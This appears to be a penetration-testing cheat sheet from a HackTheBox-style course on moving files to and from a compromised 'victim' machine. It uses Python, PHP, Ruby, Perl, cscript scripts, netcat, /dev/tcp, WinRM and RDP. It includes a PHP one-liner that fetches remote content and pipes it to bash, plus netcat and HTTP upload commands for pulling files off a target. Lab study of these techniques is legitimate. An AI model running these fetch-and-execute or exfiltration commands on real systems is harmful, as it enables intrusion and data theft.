# Transffering Files with Code

Windows default applications such as cscript and mshta can be used to execute JavaScript or VBScript code, the rest of the methods are mostly for Linux.

## Python

Download files with Python2 or Python3:
```shell-session
[/htb]$ python2.7 -c 'import urllib;urllib.urlretrieve ("<URL>", "<output file name>")'

[/htb]$ python3 -c 'import urllib.request;urllib.request.urlretrieve("<URL>", "<output file name>")'
```

## PHP

Use PHP with the [file_get_contents() module](https://www.php.net/manual/en/function.file-get-contents.php) to download the file and [file_put_contents() module](https://www.php.net/manual/en/function.file-put-contents.php) to save it to a directory:
```shell-session
[/htb]$ php -r '$file = file_get_contents("<URL>"); file_put_contents("<output file name>",$file);'
```

Use PHP to read URL's content and save it into a file:
```shell-session
[/htb]$ php -r 'const BUFFER = 1024; $fremote = 
fopen("<URL>", "rb"); $flocal = fopen("<file name>", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
```

PHP Download a file and pipe it to Bash:
```shell-session
[/htb]$ php -r '$lines = @file("<URL>"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
```

**Note:** The URL can be used as a filename with the @file function if the fopen wrappers have been enabled.

## Other Languages

Download a file with Ruby:
```shell-session
[/htb]$ ruby -e 'require "net/http"; File.write("<output file name>", Net::HTTP.get(URI.parse("<URL>")))'
```

Download a file with Perl:
```shell-session
[/htb]$ perl -e 'use LWP::Simple; getstore("<URL>", "<output file name>");'
```

## JavaScript

Save the following script into a .js file:
```javascript
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
WinHttpReq.Send();
BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1;
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1));
```

From CMD or PowerShell download a file using the script:
```cmd-session
C:\htb> cscript.exe /nologo wget.js <URL> <output file name>
```

## VBScript

Save the following scripts into a .vbs file:
```vbscript
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", WScript.Arguments.Item(0), False
xHttp.Send

with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile WScript.Arguments.Item(1), 2
end with
```

From CMD or PowerShell download a file using the script:
```cmd-session
C:\htb> cscript.exe /nologo wget.vbs <URL> <output file name>
```

## Upload Operations Using Python3

The Python3 requests module allows you to send HTTP requests.

Start the python uploadserver module:
```shell-session
[/htb]$ python3 -m uploadserver 
```

Upload a file from another machine:
```shell-session
[/htb]$ python3 -c 'import requests;requests.post("http://<ip address>:8000/upload",files={"files":open("<file path>","rb")})'
```

# Miscellaneous File Transfer Methods

## Netcat Inbound

Listening on port 8000 from the target:
```shell-session
victim@target:~$ # Example using Original Netcat
victim@target:~$ nc -l -p 8000 > <output file name>

victim@target:~$ # Example using Ncat
victim@target:~$ ncat -l -p 8000 --recv-only > <output file name>
```

Send the file to the target:
```shell-session
[/htb]$ wget -q <URL>

[/htb]$ # Example using Original Netcat
[/htb]$ nc -q 0 <ip address> 8000 < <file name>

[/htb]$ # Example using Ncat
[/htb]$ ncat --send-only <ip address> 8000 < <file name>
```

## Netcat Outbound

Send file as input to Netcat, useful when inbound connections are blocked by the firewall:
```shell-session
Wildland4958@htb[/htb]$ # Example using Original Netcat
Wildland4958@htb[/htb]$ sudo nc -l -p 443 -q 0 < <file name>

Wildland4958@htb[/htb]$ # Example using Ncat
Wildland4958@htb[/htb]$ sudo ncat -l -p 443 --send-only < <file name>
```

Connect to Netcat from the target machine to receive the file:
```shell-session
victim@target:~$ # Example using Original Netcat
victim@target:~$ nc <ip address> 443 > <file name>

victim@target:~$ # Example using Ncat
victim@target:~$ ncat <ip address> 443 --recv-only > <file name>

Wildland4958@htb[/htb]$ # If the target machine doesn't have Netcat or Ncat
victim@target:~$ cat < /dev/tcp/<ip address>/443 > <file name>
```

## PowerShell Session File Transfer

We can use PowerShell Remoting(WinRM), for this we will need administrative access or to be part of the Remote Management Users group or explicit permissions in session configuration.

Confirm you can connect to WinRM:
```powershell-session
PS C:\htb> Test-NetConnection -ComputerName DATABASE01 -Port 5985
```

Create a remote session to the target:
```powershell-session
PS C:\htb> $Session = New-PSSession -ComputerName <computer name> // Might need credentials
```

Copy a file from localhost to the target:
```powershell-session
PS C:\htb> Copy-Item -Path <source path> -ToSession $Session -Destination <destination path>
```

Copy file from the target to localhost:
```powershell-session
PS C:\htb> Copy-Item -Path "<source path>" -Destination <destination path> -FromSession $Session
```

## RDP

You can use copy paste or mount a folder.

Mounting a Linux folder using rdesktop:
```shell-session
Wildland4958@htb[/htb]$ rdesktop <ip address> -d <domain> -u <username> -p '<password>' -r disk:linux='<folder path>'
```

Mounting a Linux folder using xfreerdp:
```shell-session
Wildland4958@htb[/htb]$ xfreerdp /v:<ip address> /d:<domain> /u:<username> /p:'<password>' /drive:linux,<folder path>
```

Now from the target Windows machine you can connect trough \\tsclient\ or us mstsc (Local Resources -> More -> Drives).